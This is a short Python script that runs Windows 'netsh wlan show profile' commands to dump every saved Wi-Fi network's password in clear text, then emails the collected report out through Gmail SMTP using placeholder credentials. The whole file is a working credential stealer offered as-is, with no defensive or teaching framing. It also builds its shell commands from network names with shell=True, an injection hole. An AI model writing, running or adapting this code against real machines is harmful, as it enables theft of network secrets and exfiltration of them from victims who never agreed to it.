#!/usr/bin/env python
import re
import smtplib
import subprocess
from email.header import Header
from email.mime.text import MIMEText

import chardet


# https://myaccount.google.com/lesssecureapps


def send_mail(email, psw, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
    try:
        server.starttls()
        server.login(email, psw)
        server.sendmail(email, email, msg)
    finally:
        server.quit()


def get_wifi_info():
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)

    encoding = chardet.detect(networks)['encoding']
    networks_names_list = re.findall("(?:\\s:\\s)(.*)", networks.decode(encoding))
    result = ""
    for network_name in networks_names_list:
        command = "netsh wlan show profile " + network_name + " key=clear"
        current_result = subprocess.check_output(command, shell=True)
        result = result + current_result.decode(encoding)
    return result


msg = get_wifi_info()
print(msg)
login = "xxx@gmail.com"
psw = ""
recipients_emails = login

msg = MIMEText(msg, 'plain', 'utf-8')
msg['Subject'] = Header('Report', 'utf-8')
msg['From'] = login
msg['To'] = recipients_emails

send_mail(msg['From'], psw, msg.as_string())
